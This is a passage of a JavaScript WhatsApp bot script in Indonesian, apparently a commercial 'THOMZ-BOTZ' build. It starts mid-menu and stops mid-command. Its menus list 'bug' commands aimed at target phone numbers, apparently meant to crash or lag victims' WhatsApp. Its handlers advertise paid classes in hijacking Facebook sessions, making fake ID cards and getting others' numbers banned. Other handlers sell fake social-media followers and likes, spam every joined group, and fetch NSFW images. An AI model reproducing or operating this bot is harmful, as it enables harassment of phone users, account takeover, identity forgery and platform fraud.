*⥁*${prefix}🌵 (628xxxx)
*⥁*${prefix}🎄 (628xxxx) 
*⥁*${prefix}🌲 (628xxxx)
*⥁*${prefix}🌳 (628xxxx)
*⥁*${prefix}🌴 (628xxxx)
*⥁*${prefix}🌱 (628xxxx)
*⥁*${prefix}🌿 (628xxxx)
*⥁*${prefix}☘️ (628xxxx)
*⥁*${prefix}🍀 (628xxxx)
*⥁*${prefix}🐵 (628xxxx)
*⥁*${prefix}🙈 (628xxxx)
*⥁*${prefix}🙉 (628xxxx)
*⥁*${prefix}🙊 (628xxxx)
*⥁*${prefix}🐒 (628xxxx)
*⥁*${prefix}ꜱᴀɴᴛᴇᴛ (628xxxx)
*⥁*${prefix}ꜱᴇɴᴅɢᴀꜱꜰᴜʟʟ (628xxxx)
*⥁*${prefix}ꜱᴇɴᴅᴜɴʟɪᴛʀᴏʟɪ (628xxxx)
*⥁*${prefix}ꜱᴇɴᴅᴜɴʟɪᴅᴏᴄᴜ (628xxxx)
*⥁*${prefix}ꜱᴇɴᴅᴜɴʟɪᴄᴜʏ (628xxxx)
*⥁*${prefix}ꜱᴇɴᴅᴜɴʟɪʙᴏᴍ (628xxxx)
*⥁*${prefix}ꜱᴇɴᴅᴜɴʟɪʟᴀɢ (628xxxx)
*⥁*${prefix}ꜱᴇɴᴅᴜɴʟɪᴅᴇʟᴀʏ (628xxxx)

  BUG THOMZ DI TEMPAT
*⥁*${prefix}ᴜɴʟɪᴛᴇᴛ
*⥁*${prefix}ᴜɴʟɪᴛʀᴏʟɪ
*⥁*${prefix}ᴜɴʟɪᴅᴏᴄᴜ
*⥁*${prefix}ᴜɴʟɪᴠɪʀᴛᴇxᴛ
*⥁*${prefix}ᴜɴʟɪᴅᴇʟᴀʏ
*⥁*${prefix}ᴜɴʟɪʟᴀɢ
*⥁*${prefix}ᴜɴʟɪʙᴏᴍ
*⥁*${prefix}ᴜɴʟɪᴄᴜʏ


JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
break
case "soundmenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

  SOUND DJ
*⥁*⥁**${prefix} sound1
*⥁*${prefix} sound2
*⥁*${prefix} sound3
*⥁*${prefix} sound4
*⥁*${prefix} sound5
*⥁*${prefix} sound6
*⥁*${prefix} sound7
*⥁*${prefix} sound8
*⥁*${prefix} sound9
*⥁*${prefix} sound10
*⥁*${prefix} sound11
*⥁*${prefix} sound12
*⥁*${prefix} sound13
*⥁*${prefix} sound14
*⥁*${prefix} sound15
*⥁*${prefix} sound16
*⥁*${prefix} sound17
*⥁*${prefix} sound18
*⥁*${prefix} sound18
*⥁*${prefix} sound20
*⥁*${prefix} sound21
*⥁*${prefix} sound22
*⥁*${prefix} sound23
*⥁*${prefix} sound24
*⥁*${prefix} sound25
*⥁*${prefix} sound26
*⥁*${prefix} sound27
*⥁*${prefix} sound28
*⥁*${prefix} sound29
*⥁*${prefix} sound30
*⥁*${prefix} sound31
*⥁*${prefix} sound32
*⥁*${prefix} sound33
*⥁*${prefix} sound34
*⥁*${prefix} sound35
*⥁*${prefix} sound36
*⥁*${prefix} sound37
*⥁*${prefix} sound38
*⥁*${prefix} sound39
*⥁*${prefix} sound40
*⥁*${prefix} sound41
*⥁*${prefix} sound42
*⥁*${prefix} sound43
*⥁*${prefix} sound44
*⥁*${prefix} sound45
*⥁*${prefix} sound46
*⥁*${prefix} sound47
*⥁*${prefix} sound48
*⥁*${prefix} sound49
*⥁*${prefix} sound50
*⥁*${prefix} sound51
*⥁*${prefix} sound52
*⥁*${prefix} sound53
*⥁*${prefix} sound54
*⥁*${prefix} sound55
*⥁*${prefix} sound56
*⥁*${prefix} sound57
*⥁*${prefix} sound58
*⥁*${prefix} sound59
*⥁*${prefix} sound60
*⥁*${prefix} sound61
*⥁*${prefix} sound62
*⥁*${prefix} sound63
*⥁*${prefix} sound64
*⥁*${prefix} sound65
*⥁*${prefix} sound66
*⥁*${prefix} sound67
*⥁*${prefix} sound68
*⥁*${prefix} sound69
*⥁*${prefix} sound70
*⥁*${prefix} sound71
*⥁*${prefix} sound72
*⥁*${prefix} sound73
*⥁*${prefix} sound74
*⥁*${prefix} sound75
*⥁*${prefix} sound76
*⥁*${prefix} sound77
*⥁*${prefix} sound78
*⥁*${prefix} sound79
*⥁*${prefix} sound80
*⥁*${prefix} sound81
*⥁*${prefix} sound82
*⥁*${prefix} sound83
*⥁*${prefix} sound84
*⥁*${prefix} sound85
*⥁*${prefix} sound86
*⥁*${prefix} sound87
*⥁*${prefix} sound88
*⥁*${prefix} sound89
*⥁*${prefix} sound90
*⥁*${prefix} sound91
*⥁*${prefix} sound92
*⥁*${prefix} sound93
*⥁*${prefix} sound94
*⥁*${prefix} sound95
*⥁*${prefix} sound96
*⥁*${prefix} sound97
*⥁*${prefix} sound98
*⥁*${prefix} sound99
*⥁*${prefix} sound100
*⥁*${prefix} sound101
*⥁*${prefix} sound102
*⥁*${prefix} sound103
*⥁*${prefix} sound104
*⥁*${prefix} sound105
*⥁*${prefix} sound106
*⥁*${prefix} sound107
*⥁*${prefix} sound108
*⥁*${prefix} sound109
*⥁*${prefix} sound110
*⥁*${prefix} sound111
*⥁*${prefix} sound112
*⥁*${prefix} sound113
*⥁*${prefix} sound114
*⥁*${prefix} sound115
*⥁*${prefix} sound116
*⥁*${prefix} sound117
*⥁*${prefix} sound118
*⥁*${prefix} sound119
*⥁*${prefix} sound120
*⥁*${prefix} sound121
*⥁*${prefix} sound122
*⥁*${prefix} sound123
*⥁*${prefix} sound124
*⥁*${prefix} sound125
*⥁*${prefix} sound126
*⥁*${prefix} sound127
*⥁*${prefix} sound128
*⥁*${prefix} sound129
*⥁*${prefix} sound130
*⥁*${prefix} sound131
*⥁*${prefix} sound132
*⥁*${prefix} sound133
*⥁*${prefix} sound134
*⥁*${prefix} sound135
*⥁*${prefix} sound136
*⥁*${prefix} sound137
*⥁*${prefix} sound138
*⥁*${prefix} sound139
*⥁*${prefix} sound140
*⥁*${prefix} sound141
*⥁*${prefix} sound142
*⥁*${prefix} sound143
*⥁*${prefix} sound144
*⥁*${prefix} sound145
*⥁*${prefix} sound146
*⥁*${prefix} sound147
*⥁*${prefix} sound148
*⥁*${prefix} sound149
*⥁*${prefix} sound150
*⥁*${prefix} sound151
*⥁*${prefix} sound152
*⥁*${prefix} sound153
*⥁*${prefix} sound154
*⥁*${prefix} sound155
*⥁*${prefix} sound156
*⥁*${prefix} sound157
*⥁*${prefix} sound158
*⥁*${prefix} sound160
*⥁*${prefix} sound161

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
        break
case 'donemc':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} item,nominal`);
let item = t[0];
let nominal = t[1];
reply(`*ALHAMDULILAH ALL TRX DONE ✅*
*TERIMA KASIH ATAS KEPERCAYAANYA*
*TELAH MENGGUNAKAN JASA ADMIN*
*${botname}*

*ITEM : ${item}*
*TANGGAL : ${tanggal}*
*NOMINAL : ${nominal}*
*WAKTU : ${jam}*
*SISTEM : MC*
*BUYYER : DONE✅*
*SELLER : DONE✅*

*JIKA KEDUANYA TELAH DONE,MAKA JIKA ADA SESUATU YANG TERJADI DI LAIN HARI BUKAN TANGGUBG JAWAB ADMIN LAGI !!!*

*TERIMA KASIH TELAH MENGGUNAKAN JASA ADMIN ${botname}*`)
}
        break
case 'sendgcmurid': {
		 if (!isOwner) return (`Ngapain ? Khusus ${botname} Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,murses,linkgc,harga`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
haikal.sendMessage(mq1, {text:`*───❖》${botname}《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] MURID : ${m2}*\n*[+] LINK GC : ${m3}*\n\n*© ${botname}*`}, m) 
                 }
            break
case 'join':{
           let murid = args[0]
           if (!murid) return reply(`Bukan Kaya gitu Bang Contoh ${prefix + command} mursun`)
reply('Sabar Yah Bang Akan Segera Bang Thomz Proses Jadi Di Mohon Untuk Tunggu Sebentar')
haikal.sendMessage(`${owner}@s.whatsapp.net`, { text: `*ADA YANG ORDER ${botname}*\n*MURID : ${murid} \nDARI @${sender.split('@')[0]}*\n*APAKAH INGIN LANJUTKAN PROSES?*`, mentions: [sender]}, { quoted: m })
        }
        break
case "resellerpanel": {
const text12 = `${botname} OPEN RESELLER PANEL GENGS CUMAN 10K AJA`
reply(text12)
}
        break
case "adminpanel": {
const text12 = `${botname} OPEN ADMIN PANEL GENGS CUMAN 15K AJA`
reply(text12)
}
        break
    break
case "listlogo": {
const text12 = `LIST BUAT LOGO BY ${botname}

⨳⃨💐▢̸̷᮫۪  𝗹𝗼𝗴𝗼 𝝰𝗻𝗶𝗺𝗲 : 𝟰｡𝟬𝟬𝟬
⨳⃨💐▢̸̷᮫۪  𝗹𝗼𝗴𝗼 𝗳𝗳/𝗺𝗹 : 4｡𝟬𝟬𝟬
⨳⃨💐▢̸̷᮫۪  𝗹𝗼𝗴𝗼 𝟯𝗗 𝘀𝗼𝗹𝗼 : 𝟰｡𝟬𝟬𝟬 - 𝟭𝟬｡𝟬𝟬𝟬
⨳⃨💐▢̸̷᮫۪  𝗹𝗼𝗴𝗼 𝟯𝗗 𝗱𝘂𝗼 : 𝟲｡𝟬𝟬𝟬 - 𝟭𝟱｡𝟬𝟬𝟬
⨳⃨💐▢̸̷᮫۪. 𝗽𝗼𝘀𝘁𝗲𝗿 𝗳𝘁/𝗳𝗺 : 𝟳｡𝟬𝟬𝟬
⨳⃨💐▢̸̷᮫۪  𝗽𝗼𝘀𝘁𝗲𝗿 𝗹𝗶𝘀𝘁 𝗱𝗺/𝐣𝗼𝗸𝗶 : 𝟳｡𝟬𝟬𝟬
⨳⃨💐▢̸̷᮫۪  𝗲𝗱𝗶𝘁 𝘀𝘁𝗶𝗸𝗲𝗿 : 𝟲𝟬𝟬𝗽
⨳⃨💐▢̸̷᮫۪  𝘀𝗽𝗲𝗸 𝝰𝗸𝘂𝗻 : 𝟭𝟬｡𝟬𝟬𝟬
⨳⃨💐▢̸̷᮫۪  𝗰𝗵𝗶𝗯𝗶 𝘀𝗼𝗹𝗼 : 𝟯｡0𝟬𝟬
⨳⃨💐▢̸̷᮫۪  𝗰𝗵𝗶𝗯𝗶 𝗱𝘂𝗼 : 𝟲｡𝟬𝟬𝟬
⨳⃨💐▢̸̷᮫۪  𝗹𝗼𝗴𝗼 𝟯𝗱 𝝰𝗻𝗶𝗺𝗲 : 𝟱｡𝟬𝟬𝟬

- 𝗼𝗻𝗹𝘆 𝗹𝗼𝗴𝗼 𝐣𝝰𝗱𝗶 𝗻𝗼 𝗿𝗲𝗾 𝝰𝗽𝝰𝗽𝘂𝗻
- 𝘁𝗲𝘀𝘁𝗶? 𝗯𝝰𝗻𝘆𝝰𝗸
- 𝗽𝗿𝗼𝘀𝗲𝘀 𝟭 - 𝟭𝟬 𝗺𝗲𝗻𝗶𝘁 𝘁𝗲𝗿𝗴𝝰𝗻𝘁𝘂𝗻𝗴 𝝰𝗻𝘁𝗿𝗶𝝰𝗻
- 𝝰𝗹𝗹 𝘁𝗿𝘅 𝗻𝗼 𝗿𝗲𝗳𝗳
- 𝘀𝗶𝘀𝘁𝗲𝗺 𝘁𝗳 𝗽𝗿𝗼𝘀𝗲𝘀

Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "listviewtt": {
const text12 = `LIST VIEW TIKTOK BY ${botname}

VIEWS TIKTOK (PERMANEN)
100.000 VIEWS = 2K
200.000 VIEWS = 3K
300.000 VIEWS = 4K
400.000 VIEWS = 5K
500.000 VIEWS = 6K
600.000 VIEWS = 7K
700.000 VIEWS = 8K
800.000 VIEWS = 9K
900.000 VIEWS = 10K
1M.        VIEWS = 11K

Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "listlikett": {
const text12 = `LIST LIKE TIKTOK BY ${botname}

LIKES TIKTOK (PERMANEN)
1000 LIKE = 4k
2000 LIKE = 8K
3000 LIKE = 12K
4000 LIKE = 16K
5000 LIKE = 20K
6000 LIKE = 24K
7000 LIKE = 28K
8000 LIKE = 32K
9000 LIKE = 36K
10.000 LIKE = 40K

Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "listsuntiktt": {
const text12 = `LIST SUNTIK TT BY ${botname}

FOLLOWERS TIKTOK (PERMANEN)_
100 FOLLOWERS = 3.500 k
200 FOLLOWERS = 5.500 k
300 FOLLOWERS = 7.500 k
400 FOLLOWERS = 9.000 k
500 FOLLOWERS = 11.500 k
600 FOLLOWERS = 13.500 k
700 FOLLOWERS = 15.500 k
800 FOLLOWERS = 17.000 k
900 FOLLOWERS = 19.500 k 
1000 FOLLOWERS = 21.500 k


Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "listlikeig": {
const text12 = `LIST LIKE IG BY ${botname}

LIKES IG
1000 like : 2k
2000 like : 4k
3000 like : 6k
4000 like : 8k
5000 like : 10k
6000 like : 12k
7000 like : 14k
8000 like : 16k
9000 like : 18k
10000 like : 20k

Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "listsuntikig": {
const text12 = `LIST SUNTIK IG BY ${botname}

FOLLOWERS IG
100followers : 2.500 k
200followers : 3.500 k
300followers : 4.500 k
400followers : 5.500 k
500followers : 6.500 k
600followers : 7.500 k
Dan seterusnya....

Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "listunchek": {
const text12 = `LIST UNCHEK BY ${botname}

🛡️UNCHEK BIASA 🆕
📨21 UNCHEK - 3K
📨25 UNCHEK - 4K
🗳️30 UNCHEK - 5K
🗳️40 UNCHEK - 10K
🗳️45 UNCHEK - 15K
🗳️60 UNCHEK - 20K
🗳️70 UNCHEK - 25K
🗳️80 UNCHEK -30K
-----------------------------------
🛡️UNCHEK OLD 🆕
📦20 UNCHEK - 3K
📦25 UNCHEK - 4K
📦30 UNCHEK - 5K
📦35 UNCHEK - 10K
📦40 UNCHEK - 15K
📦45 UNCHEK - 20K
📦50 UNCHEK - 25K
📦65 UNCHEK - 30K
📦70 UNCHEK - 35K
📦80 UNCHEK - 40K

Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "listjasteb": {
const text12 = `LIST JASTEB BY ${botname}

List jasteb
5K RESS 50+
10K RESS 99+
15K RESS 150+
20K RESS 200+
25K RESS 250+
30K RESS 300+

Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "formattopup": {
const text12 = `🔥FORMAT PENGISIAN TOP UP GAME🔥
                      BY ${botname}

NICK        :
ID             :
SERVER    :
DM           :

Isi dengan benar agar tidak terjadi kesalahan yang tidak di inginkan`
reply(text12)
}
    break
case "listtopupml": {
const text12 = `LIST TOP UP ML BY ${botname}

💎 86 : Rp 19.500
💎 172 : Rp 38.500
💎 210 : Rp 52.000
💎 257 : Rp 58.00
💎 285 : Rp 66.500
💎 355 : Rp 85.500
💎 429 : Rp 96.500
💎 514 : Rp 115.500
💎 600 : Rp 135.000
💎 706 : Rp 154.000
💎 878 : Rp 192.500
💎 963 : Rp 212.000
💎 1050 : Rp 231.000
💎 1220 : Rp 270.000
💎 1412 : Rp 308.000
💎 2195 : Rp 462.000

Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "listtopupff": {
const text12 = `LIST TOP UP FF BY ${botname}

💎5 : Rp 1.000
💎10 : Rp 2.000
💎12 : Rp 2.500
💎20 : Rp 3.000
💎50 : Rp 8.000
💎70 : Rp 10.000
💎100 : Rp 16.000
💎120 : Rp 18.500
💎130 : Rp 19.000
💎140 : Rp 21.000
💎150 : Rp 23.500
💎190 : Rp 28.500
💎200 : Rp 30.000
💎210 : Rp 31.000
💎280 : Rp 40.000
💎355 : Rp 50.500
💎425 : Rp 60.000
💎500 : Rp 72.000
💎565 : Rp 80.500
💎720 : Rp 100.000
💎Membership Mingguan = 32.000
💎Membership Bulanan = 90.000

Ketik .payment Untuk Melanjutkan Pembayaran`
reply(text12)
}
    break
case "jadwalft": {
const text12 = `UNTUK JADWAL FT BISA TANYAKAN KEPADA OWNER ${owner}`
reply(text12)
}
    break
case "formatft": {
const text12 = `🔥FORMAT PENGISIAN ${botname}🔥

NAMA TIM : 
Player 1 :
Player 2 :
Player 3 :
Player 4 :

Sesi :
FT    :

💳 Payment 
Dana    : ${nodana}
Gopay  : ${nogopay}

⛔Krim Bukti TF Lngsung Msuk Grup🙏`
reply(text12)
}
    break
case "donerekber": {
const text12 = `ALL TRX DONE ✅
 

   BUUYER : ✅
   SELLEER : ✅


NOTE ⛔ : JIKA ADA KENDALA DI LAIN WAKTU ADMIN SUDAH TIDAK BERTANGGUNG JAWAB ❗❗


TERIMA KASIH SUDAH BERBELANJA DI ${botname}`
reply(text12)
}
break
case "danamasuk": {
const text12 = `DANA MASUK!

SILAHKAN SEND DATA SECARA PRIBADI KALO SUDAH DONE DAN DATA SUDAH DI AMANKAN SILAHKAN KETIK DONE KE GRUP BESERTA BUKTI SS LOGIN AKUN AGAR DANA BISA DI CAIRKAN KE PENJUAL UNTUK PENJUAL SILAHKAN KETIK .formatpencairan LALU ISI DENGAN BENAR AGAR KAMI TIDAK SALAH MENCAIRKAN DANA KESALAHAN DI TANGGUNG PENJUAL

X TRX BATAL FEE KEPOTONG X
BE SMART BUYER AND SELLER`
reply(text12)
}
break
case "allrec": {
const text12 = `REKAM LAYAR!

> HAPUS SEMUA PESAN GMAIL
> KOSONGKAN SEMUA SAMPAH GMAIL
> HAPUS AKUN FB DARI PERANGKAT
> LOGOUT FF`
reply(text12)
}
break
case "formatpencairan": {
const text12 = `FORMAT PENCAIRAN ${botname}

Pencarian : 
No pay    : 
Atas nama :

KESALAHAN PADA NOMOR PENCAIRAN BUKAN JADI TANGGUNG JAWAB KAMI TOLONG DI CEK DENGAN DETAIL DAN SEBENAR-BENARNYA AGAR TIDAK TERJADI KESALAHAN YANG TIDAK DI INGINKAN KESALAHAN PADA NOMOR PENCAIRAN KAMI TIDAK AKAN BERTANGGUNG JAWAB`
reply(text12)
}
break
case "mursun": {
const text12 = `JOIN MURSUN BY ${botname}

KEUNTUNGAN
> Bisa Jualan Followers
> Bisa Open Mursun
> Di Kasih Metode Suntik
> Di Jamin Balmod

JANGAN LUPA KETIK .join mursun AGAR CEPAT DI PROSES`
reply(text12)
}
break
case "murbug": {
const text12 = `JOIN MURBUG BY ${botname}

KEUNTUNGAN
> Bisa Bug Nomor Ripper
> Bisa Jadi Jasa Bug
> Bisa Bug Sesukamu
> Di Jamin Balmod

JANGAN LUPA KETIK .join murbug AGAR CEPAT DI PROSES`
reply(text12)
}
break
case "murses": {
const text12 = `JOIN MURSES BY ${botname}

KEUNTUNGAN
> Bisa Buka Sesi kunci FB
> Auto Jebol
> Di Kasih Metode Buka Sesi
> Di Kasih Tutor Buat Fake Ktp
> Di Jamin Balmod

JANGAN LUPA KETIK .join murses AGAR CEPAT DI PROSES`
reply(text12)
}
break
case "murnokos": {
const text12 = `JOIN MURNOKOS BY ${botname}

KEUNTUNGAN
> Bisa Buat Nokos No Ribet
> Bisa Open Murnokos
> Di Kasih Metode Buat Nokos
> Bisa Jualan Nokos
> Di Jamin Balmod

JANGAN LUPA KETIK .join murnokos AGAR CEPAT DI PROSES`
reply(text12)
}
break
case "murkenon": {
const text12 = `JOIN MURKENON BY ${botname}

KEUNTUNGAN
> Bisa Kenon Wa Ripper
> Bisa Jadi Kang Kenon
> DI kasih Metode Kenon
> Di Kasih Apk Kenon

JANGAN LUPA KETIK .join murkenon AGAR CEPAT DI PROSES`
reply(text12)
}
break
case "murunbanned": {
const text12 = `JOIN MURUNBANNED BY ${botname}

KEUNTUNGAN
> Bisa Unabanned wa 
> Bisa Open Jasa Unbanned
> Di Kasih Metode Unbanned
> Bisa Di Jual Kembali
> Di Jamin Balmod

JANGAN LUPA KETIK .join murunbanned AGAR CEPAT DI PROSES`
reply(text12)
}
break
case 'jpmfoto': case 'jpmvidio': {
if (!isOwner) return reply(`Khusus Thomz Kece`)
        if (!q) return reply(`*Enter Text*`)
        let getGroups = await haikal.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(`\`\`\`Broadcasting in\`\`\` *${xeoncast.length}* \`\`\`Group Chat, in\`\`\` *${xeoncast.length * 1.5} seconds*`)
        for (let i of xeoncast) {
let txt = `*${global.ownerName}'s Broadcast*\n\n\`\`\`Message :\`\`\` *${q}*`
if(/image/.test(mime)) {
let media = await quoted.download()
await haikal.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await haikal.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        reply(`\`\`\`Successfuly Broadcasted in\`\`\` *${xeoncast.length} Groups*`)      
}
        break
case 'jpm3': {
if (!isOwner) return reply(`Khusus Thomz kece`)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} Thomz Ganteng`
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Jpm Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(3000)
haikal.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
case 'cecanindo': {
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
let { pinterest } = require('./all/scraper')
anu = await pinterest(`cecan indo`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanjepan': {
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
let { pinterest } = require('./all/scraper')
anu = await pinterest(`cecan jepang`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanmalaysia': {
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
let { pinterest } = require('./all/scraper')
anu = await pinterest(`cecan malaysia`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanhijaber': {
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
let { pinterest } = require('./all/scraper')
anu = await pinterest(`cecan hijaber`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanchina': {
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
let { pinterest } = require('./all/scraper')
anu = await pinterest(`cecan china`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanvietnam': {
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
let { pinterest } = require('./all/scraper')
anu = await pinterest(`cecan vietnam`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecankorea': {
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
let { pinterest } = require('./all/scraper')
anu = await pinterest(`cecan korea`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecan': {
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
let { pinterest } = require('./all/scraper')
anu = await pinterest(`cecan`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================//
case 'art':
case 'awoo':
case 'bts':
case 'cogan':
case 'elaina':
case 'exo':
case 'elf':
case 'estetic':
case 'kanna':
case 'loli':
case 'neko2':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
case 'quotesimage':
reply(mess.wait)
haikal.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` } })
break
//=================================================//
case 'neko' :
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
haikal.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺🥺`},{ quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'waifu' :
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
haikal.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ahh Sayang 🥺🙏`}, { quoted:m }).catch(err => {
 return('Error!')
})
break
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
 if (!isOwner) return reply(mess.only.owner)
 reply(mess.wait)
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
haikal.sendImage(from, data.url, 'Success Coy', m)
})
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Buat Bang Thomz`)
thomzz = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(m.chat, { audio: thomzz, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'mediafire': {
